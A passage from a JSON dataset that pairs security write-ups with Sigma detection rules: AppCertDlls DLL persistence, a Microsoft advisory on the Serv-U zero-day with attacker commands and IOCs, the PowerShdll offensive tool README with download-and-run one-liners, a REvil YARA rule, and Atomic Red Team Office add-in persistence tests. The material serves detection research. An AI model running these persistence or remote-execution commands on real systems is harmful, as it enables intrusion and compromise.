page\n\nEvery ISAPI filter is contained in a separate DLL that must export two entry-point functions, GetFilterVersion and HttpFilterProc, and optionally export the TerminateFilter function. The metabase property, FilterLoadOrder, contains a list of all filters that IIS loads when the Web service is started.\n\n### AppCertDlls\n\nThis is also a known technique – it has been researched and published by EP_X0FF in 2007 on sysinternals forum. There were a few follow-up posts about it, and a sample code can be found here, here and here. If you are interested you may also read ReactOS code that implements this feature here (search for ‘BasepIsProcessAllowed’).\n\nUsing a slightly modified code from one of the posts, we can build a DLL to demonstrate how it works.\n\nFirst we need to add a registry key:\n\n```\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\n```\n\nthen any REG_EXPAND_SZ value pointing to a DLL we have built.\n\n```image\nAlt: appcertsdll1\nDescription: The image displays a screenshot of the Windows Registry Editor. It shows the path 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls' in the left pane. The right pane lists two entries: a (Default) entry of type 'REG_SZ' with no value set, and a 'foo' entry of type 'REG_EXPAND_SZ' with the data 'c:\\test\\cpn.dll'. This demonstrates how to set up a registry key to load a DLL for process creation notifications.\nTranscription: |\n  Registry Editor\n  \n  Session Manager\n      AppCertDlls\n      AppCompatibility\n      AppPatches\n      DOS Devices\n  \n  My Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\n  \n  Name           Type               Data\n  (Default)      REG_SZ             (value not set)\n  foo            REG_EXPAND_SZ      c:\\test\\cpn.dll\n```\n\nNow we need to restart the system to ensure a system-wide coverage. For testing purposes, it is okay to restart Windows Explorer so that it can refresh its internal program state to include these DLL in a process creation sequence. Or, one can simply launch cmd.exe and then run programs from command line to observe the DLL being loaded into each newly created process:\n\n```image\nAlt: appcertsdll2\nDescription: The image displays a log output that shows the debugging information related to process creation notifications in a Windows environment. The log includes a timestamp, the process being executed (e.g., notepad.exe, calc.exe, iexplore.exe), and debug messages indicating whether the process creation is allowed. The format of the log suggests it is part of an analysis demonstrating the behavior of a DLL registered in the AppCertDlls registry key.\nTranscription: |\n  #    Time           Debug  Print\n  0    0.000000000    [1980] C:\\WINDOWS\\system32\\notepad.exe\n  1    0.0002394      [1980] [AppCertDll::CreateProcessNotify] APPCERT_IMAGE_OK_TO_RUN\n  2    0.0002863      [1980] [AppCertDll::CreateProcessNotify] APPCERT_IMAGE_OK_TO_RUN\n  3    3.77639413     [1980] C:\\WINDOWS\\system32\\calc.exe\n  4    3.77660990     [1980] [AppCertDll::CreateProcessNotify] APPCERT_IMAGE_OK_TO_RUN\n  5    3.77662827     [1980] [AppCertDll::CreateProcessNotify] APPCERT_CREATION_ALLOWED\n  6    24.92748642    [1980] C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE\n  7    24.92757988    [1980] [AppCertDll::CreateProcessNotify] APPCERT_IMAGE_OK_TO_RUN\n  8    24.92766380    [1980] [AppCertDll::CreateProcessNotify] APPCERT_CREATION_ALLOWED\n```\n\nYou may be wondering how it works under 64-bit system. It works pretty well.\n\nIn fact, you can register both 32-bit and 64-bit DLLs as a notification on a 64-bit system:\n\n```image\nAlt: appcertsdll3\nDescription: The image depicts a screenshot of the Windows Registry Editor, specifically focusing on the 'AppCertDlls' registry key located at 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager'. It shows the entries under 'AppCertDlls', including (Default), foo32, and foo64, with their respective data types and values. The values indicate paths to DLL files (c:\\test\\cpn.dll and c:\\test\\cpn64.dll) that have been registered for usage.\nTranscription: |\n  Registry Editor\n  \n  Session Manager\n      AppCertDlls\n          Name         Type             Data\n          (Default)    REG_SZ           (value not set)\n          foo32        REG_EXPAND_SZ    c:\\test\\cpn.dll\n          foo64        REG_EXPAND_SZ    c:\\test\\cpn64.dll\n  \n  Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\n```\n\nto ensure notifications will be processed for both 64-bit and 32-bit programs:\n\n```image\nAlt: appcertsdll6\nDescription: The image displays a debug log output from a process monitoring tool. It lists the timestamps and debug information related to the execution of the 'calc.exe' process on a Windows system. Each entry includes a timestamp, process ID, and debug print statements indicating actions taken by the AppCertDLL, such as 'APPCERT_IMAGE_OK_TO_RUN' and 'APPCERT_CREATION_ALLOWED'. This log illustrates the functioning of AppCertDlls in allowing or denying process creation based on specified criteria.\nTranscription: |\n  #    Time          Debug Print\n  1    0.00000000    [2996] c:\\windows\\SysWOW64\\calc.exe\n  2    0.00000044    [2996] [AppCertDll::CreateProcessNotify64] APPCERT_IMAGE_OK_TO_RUN\n  3    0.00013961    [2996] [AppCertDll::CreateProcessNotify64] APPCERT_CREATION_ALLOWED\n  4    7.98812294    [2996] c:\\windows\\System32\\calc.exe\n  5    7.98818970    [2996] [AppCertDll::CreateProcessNotify64] APPCERT_IMAGE_OK_TO_RUN\n  6    7.98823833    [2996] [AppCertDll::CreateProcessNotify64] APPCERT_CREATION_ALLOWED\n  7    31.26728821   [2776] c:\\windows\\SysWOW64\\calc.exe\n  8    31.26737785   [2776] [AppCertDll::CreateProcessNotify] APPCERT_IMAGE_OK_TO_RUN\n  9    31.26895332   [2776] [AppCertDll::CreateProcessNotify] APPCERT_CREATION_ALLOWED\n  10   39.54364395   [2776] c:\\windows\\SysWOW64\\calc.exe\n  11   39.54369354   [2776] [AppCertDll::CreateProcessNotify] APPCERT_IMAGE_OK_TO_RUN\n  12   39.54380035   [2776] [AppCertDll::CreateProcessNotify] APPCERT_CREATION_ALLOWED\n```",
    "sigma_rule": {
      "title": "New DLL Added to AppCertDlls Registry Key",
      "id": "6aa1d992-5925-4e9f-a49b-845e51d1de01",
      "status": "test",
      "description": "Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry key can be abused to obtain persistence and privilege escalation\nby causing a malicious DLL to be loaded and run in the context of separate processes on the computer.\n",
      "references": [
        "http://www.hexacorn.com/blog/2013/01/19/beyond-good-ol-run-key-part-3/",
        "https://eqllib.readthedocs.io/en/latest/analytics/14f90406-10a0-4d36-a672-31cabe149f2f.html"
      ],
      "author": "Ilyas Ochkov, oscd.community",
      "date": "2019-10-25",
      "modified": "2021-11-27",
      "tags": [
        "attack.persistence",
        "attack.t1546.009"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "TargetObject": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls"
          },
          {
            "NewName": "HKLM\\SYSTEM\\CurentControlSet\\Control\\Session Manager\\AppCertDlls"
          }
        ],
        "condition": "selection"
      },
      "fields": [
        "EventID",
        "Image",
        "TargetObject",
        "NewName"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_new_dll_added_to_appcertdlls_registry_key.yml"
  },
  "19": {
    "url": "https://www.microsoft.com/en-us/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/",
    "markdown": "# Microsoft discovers threat actor targeting SolarWinds Serv-U software with 0-day exploit\n\n**Published on** July 13, 2021\n\n---\n\nMicrosoft has detected a 0-day remote code execution exploit being used to attack SolarWinds Serv-U FTP software in limited and targeted attacks. The Microsoft Threat Intelligence Center (MSTIC) attributes this campaign with high confidence to DEV-0322, a group operating out of China, based on observed victimology, tactics, and procedures.\n\nThe vulnerability being exploited is CVE-2021-35211, which was recently patched by SolarWinds. The vulnerability, which Microsoft reported to SolarWinds, exists in Serv-U’s implementation of the Secure Shell (SSH) protocol. If Serv-U’s SSH is exposed to the internet, successful exploitation would give attackers the ability to remotely run arbitrary code with privileges, allowing them to perform actions like installing and running malicious payloads, or viewing and changing data. We strongly urge all customers to update their instances of Serv-U to the latest available version.\n\nMicrosoft 365 Defender has been protecting customers against malicious activity resulting from successful exploitation, even before the security patch was available. Microsoft Defender Antivirus blocks malicious files, behavior, and payloads. Our endpoint protection solution detects and raises alerts for the attacker’s follow-on malicious actions. Microsoft Threat Experts customers who were affected were notified of attacker activity and were aided in responding to the attack.\n\nMicrosoft would like to thank SolarWinds for their cooperation and quick response to the vulnerability we reported.\n\n## Who is DEV-0322?\n\nMSTIC tracks and investigates a range of malicious cyber activities and operations. During the tracking and investigation phases prior to when MSTIC reaches high confidence about the origin or identity of the actor behind an operation, we refer to the unidentified threat actor as a “development group” or “DEV group” and assign each DEV group a unique number (DEV-####) for tracking purposes.\n\nMSTIC has observed DEV-0322 targeting entities in the U.S. Defense Industrial Base Sector and software companies. This activity group is based in China and has been observed using commercial VPN solutions and compromised consumer routers in their attacker infrastructure.\n\n## Attack details\n\nMSTIC discovered the 0-day attack behavior in Microsoft 365 Defender telemetry during a routine investigation. An anomalous malicious process was found to be spawning from the Serv-U process, suggesting that it had been compromised. Some examples of the malicious processes spawned from *Serv-U.exe* include:\n\n- *C:\\Windows\\System32\\mshta.exe http://144[.]34[.]179[.]162/a* (defanged)\n- *cmd.exe /c whoami > “./Client/Common/redacted.txt”*\n- *cmd.exe /c dir > “.\\Client\\Common\\redacted.txt”*\n- *cmd.exe /c “”C:\\Windows\\Temp\\Serv-U.bat””*\n- *powershell.exe C:\\Windows\\Temp\\Serv-U.bat*\n- *cmd.exe /c type \\\\redacted\\redacted.Archive > “C:\\ProgramData\\RhinoSoft\\Serv-U\\Users\\Global Users\\redacted.Archive”*\n\nWe observed DEV-0322 piping the output of their *cmd.exe* commands to files in the Serv-U *\\Client\\Common\\* folder, which is accessible from the internet by default, so that the attackers could retrieve the results of the commands. The actor was also found adding a new global user to Serv-U, effectively adding themselves as a Serv-U administrator, by manually creating a crafted *.Archive* file in the *Global Users* directory. Serv-U user information is stored in these *.Archive* files.\n\nDue to the way DEV-0322 had written their code, when the exploit successfully compromises the Serv-U process, an exception is generated and logged to a Serv-U log file, *DebugSocketLog.txt*. The process could also crash after a malicious command was run.\n\nBy reviewing telemetry, we identified features of the exploit, but not a root-cause vulnerability. MSTIC worked with the Microsoft Offensive Security Research team, who performed vulnerability research on the Serv-U binary and identified the vulnerability through black box analysis. Once a root cause was found, we reported the vulnerability to SolarWinds, who responded quickly to understand the issue and build a patch.\n\nTo protect customers before a patch was available, the Microsoft 365 Defender team quickly released detections that catch known malicious behaviors, ensuring customers are protected from and alerted to malicious activity related to the 0-day. Affected customers enrolled in Microsoft Threat Experts, our managed threat hunting service, received a targeted attack notification, which contained details of the compromise. The Microsoft Threat Experts and MSTIC teams worked closely with these customers to respond to the attack and ensure their environments were secure.\n\n## Detection guidance\n\nCustomers should review the Serv-U *DebugSocketLog.txt* log file for exception messages like the line below. A *C0000005; CSUSSHSocket::ProcessReceive* exception can indicate that an exploit was attempted, but it can also appear for unrelated reasons. Either way, if the exception is found, customers should carefully review their logs for behaviors and indicators of compromise discussed here.\n\n```\nEXCEPTION: C0000005; CSUSSHSocket::ProcessReceive(); Type: 30; puchPayLoad = 0x03e909f6; nPacketLength = 76; nBytesReceived = 80; nBytesUncompressed = 156; uchPaddingLength = 5\n```\n\nAdditional signs of potential compromise include:\n\n- Recent creation of *.txt* files in the Client\\Common\\ directory for the Serv-U installation. These files may contain output from Windows commands like whoami and dir.\n- *Serv-U.exe* spawning child processes that are not part of normal operations. These could change depending on the customer environment, but we suggest searching for:\n  - *mshta.exe*\n  - *powershell.exe*\n  - *cmd.exe* (or *conhost.exe* then spawning *cmd.exe*) with any of the following in the command line:\n    - *whoami*\n    - *dir*\n    - *./Client/Common*\n    - *.\\Client\\Common*\n    - *type [a file path] > “C:\\ProgramData\\RhinoSoft\\Serv-U\\Users\\Global Users\\[file name].Archive”*\n  - Any process with any of the following in the command line:\n    - *C:\\Windows\\Temp\\*\n\n- The addition of any unrecognized global users to Serv-U. This can be checked in the Users tab of the Serv-U Management Console, as shown below. It can also be checked by looking for recently created files in *C:\\ProgramData\\RhinoSoft\\Serv-U\\Users\\Global Users*, which appears to store the Global users information.\n\n```image\nAlt: Serv-U Management Console\nDescription: The image depicts the Serv-U Management Console, specifically the 'Users' section. It shows options such as 'Global Users' and 'Database Users' along with a brief description that highlights the functionality to create, modify, and delete global user accounts. The interface is organized with a sidebar menu allowing navigation to other sections like 'Dashboard', 'Server Details', and 'Groups'. This visual aids in understanding how to check for unrecognized global users, which is relevant to detecting potential compromises in the context of the reported threat.\nTranscription: |\n  Serv-U Management Console - Server\n  \n  Serv-U Management Console\n  \n  Global\n  - Dashboard\n  - Server Details\n  - Users\n    - Users - Create, modify, and delete global users and database users.\n      - Global Users\n      - Database Users\n      - This list shows the global user accounts for all domains.\n```\n\n### Detection details\n\n#### Antivirus detections\n\nMicrosoft Defender Antivirus detects threat components as the following malware:\n\n- Behavior:Win32/ServuSpawnSuspProcess.A\n- Behavior:Win32/ServuSpawnCmdClientCommon.A\n\n#### Endpoint detection and response (EDR) alerts\n\nAlerts with the following titles in Microsoft Defender for Endpoint can indicate threat activity on your network:\n\n- Suspicious behavior by Serv-U.exe\n\n#### Azure Sentinel query\n\nTo locate possible exploitation activity using Azure Sentinel, customers can find a Sentinel query containing these indicators in this GitHub repository.\n\n### Indicators of compromise (IOCs)\n\n- 98[.]176[.]196[.]89\n- 68[.]235[.]178[.]32\n- 208[.]113[.]35[.]58\n- 144[.]34[.]179[.]162\n- 97[.]77[.]97[.]58\n- hxxp://144[.]34[.]179[.]162/a\n- C:\\Windows\\Temp\\Serv-U.bat\n- C:\\Windows\\Temp\\test\\current.dmp",
    "sigma_rule": {
      "title": "Suspicious Script Execution From Temp Folder",
      "id": "a6a39bdb-935c-4f0a-ab77-35f4bbf44d33",
      "status": "test",
      "description": "Detects a suspicious script executions from temporary folder",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/"
      ],
      "author": "Florian Roth (Nextron Systems), Max Altgelt (Nextron Systems), Tim Shelton",
      "date": "2021-07-14",
      "modified": "2022-10-05",
      "tags": [
        "attack.execution",
        "attack.t1059"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\mshta.exe",
            "\\wscript.exe",
            "\\cscript.exe"
          ],
          "CommandLine|contains": [
            "\\Windows\\Temp",
            "\\Temporary Internet",
            "\\AppData\\Local\\Temp",
            "\\AppData\\Roaming\\Temp",
            "%TEMP%",
            "%TMP%",
            "%LocalAppData%\\Temp"
          ]
        },
        "filter": {
          "CommandLine|contains": [
            " >",
            "Out-File",
            "ConvertTo-Json",
            "-WindowStyle hidden -Verb runAs",
            "\\Windows\\system32\\config\\systemprofile\\AppData\\Local\\Temp\\Amazon\\EC2-Windows\\"
          ]
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Administrative scripts"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_script_exec_from_temp.yml"
  },
  "20": {
    "url": "https://github.com/p3nt4/PowerShdll",
    "markdown": "# PowerShdll\n\nRun PowerShell with dlls only.\nDoes not require access to powershell.exe as it uses powershell automation dlls.\nPowerShdll can be run with: rundll32.exe, installutil.exe, regsvcs.exe, regasm.exe, regsvr32.exe or as a standalone executable.\n\n## dll mode:\n\n### Rundll32:\n```\nUsage:\nrundll32 PowerShdll,main <script>\nrundll32 PowerShdll,main -h      Display this message\nrundll32 PowerShdll,main -f <path>       Run the script passed as argument\nrundll32 PowerShdll,main -w      Start an interactive console in a new window (Default)\nrundll32 PowerShdll,main -i      Start an interactive console in this console\nIf you do not have an interractive console, use -n to avoid crashes on output\n```\n\n### Alternatives (Credit to SubTee for these techniques):\n```\n1.\n    x86 - C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U PowerShdll.dll\n    x64 - C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.3031964\\InstallUtil.exe /logfile= /LogToConsole=false /U PowerShdll.dll\n2.\n    x86 C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe PowerShdll.dll\n    x64 C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regsvcs.exe PowerShdll.dll\n3.\n    x86 C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U PowerShdll.dll\n    x64 C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U PowerShdll.dll\n4.\n    regsvr32 /s  /u PowerShdll.dll -->Calls DllUnregisterServer\n    regsvr32 /s PowerShdll.dll --> Calls DllRegisterServer\n```\n\n## exe mode\n```\nUsage:\nPowerShdll.exe <script>\nPowerShdll.exe -h      Display this message\nPowerShdll.exe -f <path>       Run the script passed as argument\nPowerShdll.exe -i      Start an interactive console in this console (Default)\n```\n\n## Embeded payloads\nPayloads can be embeded by modifying the \"payload\" variable in the start method of the common.cs file. If a payload is embeded, all other varguments will be ignored and the payload will be executed upon running PowerShdll.\n\n## Examples\n\n### Run base64 encoded script\n```\nrundll32 Powershdll.dll,main [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String(\"BASE64\")) ^| iex\n```\nNote: Empire stagers need to be decoded using [System.Text.Encoding]::Unicode\n\n### Download and run script\n```\nrundll32 PowerShdll.dll,main . { iwr -useb https://website.com/Script.ps1 } ^| iex;\n```\n\n## Requirements\n- .Net v3.5 for dll mode.\n- .Net v2.0 for exe mode.\n\n## Known Issues\nSome errors do not seem to show in the output. May be confusing as commands such as Import-Module do not output an error on failure.\nMake sure you have typed your commands correctly.\nIn dll mode, interractive mode and command output rely on hijacking the parent process' console. If the parent process does not have a console, use the -n switch to not show output otherwise the application will crash.\nDue to the way Rundll32 handles arguments, using several space characters between switches and arguments may cause issues. Multiple spaces inside the scripts are okay.\n\n## Disclaimer\nThis project is intended for security researchers and penetration testers and should only be used with the approval of system owners.",
    "sigma_rule": {
      "title": "PowerShell Core DLL Loaded By Non PowerShell Process",
      "id": "092bc4b9-3d1d-43b4-a6b4-8c8acd83522f",
      "related": [
        {
          "id": "867613fb-fa60-4497-a017-a82df74a172c",
          "type": "obsolete"
        },
        {
          "id": "fe6e002f-f244-4278-9263-20e4b593827f",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects loading of essential DLLs used by PowerShell by non-PowerShell process.\nDetects behavior similar to meterpreter's \"load powershell\" extension.\n",
      "references": [
        "https://adsecurity.org/?p=2921",
        "https://github.com/p3nt4/PowerShdll"
      ],
      "author": "Tom Kern, oscd.community, Natalia Shornikova, Tim Shelton, Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)",
      "date": "2019-11-14",
      "modified": "2024-01-17",
      "tags": [
        "attack.t1059.001",
        "attack.execution"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Description": "System.Management.Automation"
          },
          {
            "OriginalFileName": "System.Management.Automation.dll"
          },
          {
            "ImageLoaded|endswith": [
              "\\System.Management.Automation.dll",
              "\\System.Management.Automation.ni.dll"
            ]
          }
        ],
        "filter_main_generic": {
          "Image|endswith": [
            ":\\Program Files\\PowerShell\\7\\pwsh.exe",
            ":\\Windows\\System32\\dsac.exe",
            ":\\WINDOWS\\System32\\RemoteFXvGPUDisablement.exe",
            ":\\Windows\\System32\\runscripthelper.exe",
            ":\\WINDOWS\\System32\\sdiagnhost.exe",
            ":\\Windows\\System32\\ServerManager.exe",
            ":\\Windows\\System32\\SyncAppvPublishingServer.exe",
            ":\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe",
            ":\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            ":\\Windows\\System32\\winrshost.exe",
            ":\\Windows\\System32\\wsmprovhost.exe",
            ":\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell_ise.exe",
            ":\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            ":\\Windows\\SysWOW64\\winrshost.exe",
            ":\\Windows\\SysWOW64\\wsmprovhost.exe"
          ]
        },
        "filter_main_dotnet": {
          "Image|contains": [
            ":\\Windows\\Microsoft.NET\\Framework\\",
            ":\\Windows\\Microsoft.NET\\Framework64\\"
          ],
          "Image|endswith": "\\mscorsvw.exe"
        },
        "filter_optional_sql_server_mgmt": {
          "Image|contains": [
            ":\\Program Files (x86)\\Microsoft SQL Server Management Studio",
            ":\\Program Files\\Microsoft SQL Server Management Studio"
          ],
          "Image|endswith": "\\IDE\\Ssms.exe"
        },
        "filter_optional_sql_server_tools": {
          "Image|contains": [
            ":\\Program Files (x86)\\Microsoft SQL Server\\",
            ":\\Program Files\\Microsoft SQL Server\\"
          ],
          "Image|endswith": "\\Tools\\Binn\\SQLPS.exe"
        },
        "filter_optional_citrix": {
          "Image|endswith": "\\Citrix\\ConfigSync\\ConfigSyncRun.exe"
        },
        "filter_optional_vs": {
          "Image|contains": [
            ":\\Program Files (x86)\\Microsoft Visual Studio\\",
            ":\\Program Files\\Microsoft Visual Studio\\"
          ]
        },
        "filter_optional_chocolatey": {
          "Image|contains": ":\\ProgramData\\chocolatey\\choco.exe"
        },
        "filter_optional_nextron": {
          "Image|contains": ":\\Windows\\Temp\\asgard2-agent\\",
          "Image|endswith": [
            "\\thor64.exe",
            "\\thor.exe"
          ]
        },
        "filter_optional_aurora": {
          "Image": null
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Used by some .NET binaries, minimal on user workstation.",
        "Used by Microsoft SQL Server Management Studio"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_dll_system_management_automation_susp_load.yml"
  },
  "21": {
    "url": "https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar",
    "markdown": "# Raccine / yara / mal_revil.yar\n\n```\nrule MAL_REvil_Dec20 {\n   meta:\n      description = \"Detects PowerShell invocation as used by REvil loader\"\n      author = \"Florian Roth\"\n      date = \"2020-12-02\"\n      reference = \"https://app.any.run/tasks/b5146ffd-328f-4d6f-9bf7-c544d02f1d47/\"\n      score = 60\n   strings:\n        /* Encoded Command */\n        $ = \" -Enc \\\"PAA\" ascii\n\n        /* [Reflection.Assembly]::Load( */\n        $ = \"WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA\" ascii\n        $ = \"sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA\" ascii\n        $ = \"bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA\" ascii\n\n        /* Win32_Shadowcopy | ForEach-Object */ \n        $ = \"VwBpAG4AMwAyAF8AUwBoAGEAZABvAHcAYwBvAHAAeQAgAHwAIABGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQA\" ascii\n        $ = \"cAaQBuADMAMgBfAFMAaABhAGQAbwB3AGMAbwBwAHkAIAB8ACAARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0A\" ascii\n        $ = \"XAGkAbgAzADIAXwBTAGgAYQBkAG8AdwBjAG8AcAB5ACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdA\" ascii\n   condition:\n      1 of them\n}\n```",
    "sigma_rule": {
      "title": "PowerShell Base64 Encoded Reflective Assembly Load",
      "id": "62b7ccc9-23b4-471e-aa15-6da3663c4d59",
      "related": [
        {
          "id": "9c0295ce-d60d-40bd-bd74-84673b7592b1",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects base64 encoded .NET reflective loading of Assembly",
      "references": [
        "https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar",
        "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/"
      ],
      "author": "Christian Burkard (Nextron Systems), pH-T (Nextron Systems)",
      "date": "2022-03-01",
      "modified": "2023-01-30",
      "tags": [
        "attack.execution",
        "attack.t1059.001",
        "attack.defense-evasion",
        "attack.t1027",
        "attack.t1620"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA",
            "sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA",
            "bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA",
            "AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC",
            "BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp",
            "AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK",
            "WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ",
            "sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA",
            "bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA",
            "WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA",
            "sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA",
            "bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA"
          ]
        },
        "condition": "selection"
      },
      "fields": [
        "CommandLine"
      ],
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_base64_reflection_assembly_load.yml"
  },
  "22": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/4ae9580a1a8772db87a1b6cdb0d03e5af231e966/atomics/T1137.006/T1137.006.md",
    "markdown": "# T1137.006 - Office Application Startup: Add-ins\n\n## Description from ATT&CK\n\nAdversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018)\n\nAdd-ins can be used to obtain persistence because they can be set to execute code when an Office application starts.\n\n## Atomic Tests\n\n- Atomic Test #1 - Code Executed Via Excel Add-in File (XLL)\n- Atomic Test #2 - Persistent Code Execution Via Excel Add-in File (XLL)\n- Atomic Test #3 - Persistent Code Execution Via Word Add-in File (WLL)\n- Atomic Test #4 - Persistent Code Execution Via Excel VBA Add-in File (XLAM)\n- Atomic Test #5 - Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM)\n\n---\n\n### Atomic Test #1 - Code Executed Via Excel Add-in File (XLL)\n\nLoads an XLL file using the excel add-ins library. This causes excel to launch Notepad.exe as a child process. This atomic test does not include persistent code execution as you would typically see when this is implemented in malware.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 441b1a0f-a771-428a-8af0-e99e4698cda3\n\n#### Attack Commands: Run with `powershell`!\n\n```\n$excelApp = New-Object -COMObject \"Excel.Application\"\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\n    Write-Host \"64-bit Office\"\n    $excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\")\n}\nelse{\n    Write-Host \"32-bit Office\"\n    $excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")\n}\n```\n\n#### Cleanup Commands:\n\n```\nStop-Process -Name \"notepad\",\"Excel\" -ErrorAction Ignore\n```\n\n---\n\n### Atomic Test #2 - Persistent Code Execution Via Excel Add-in File (XLL)\n\nCreates an Excel Add-in file (XLL) and sets a registry key to make it run automatically when Excel is started. The sample XLL provided launches the notepad as a proof-of-concept for persistent execution from Office.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 9c307886-9fef-41d5-b344-073a0f5b2f5f\n\n#### Attack Commands: Run with `powershell`!\n\n```\n$excelApp = New-Object -COMObject \"Excel.Application\"\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\n    Write-Host \"64-bit Office\"\n    Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\nelse{\n    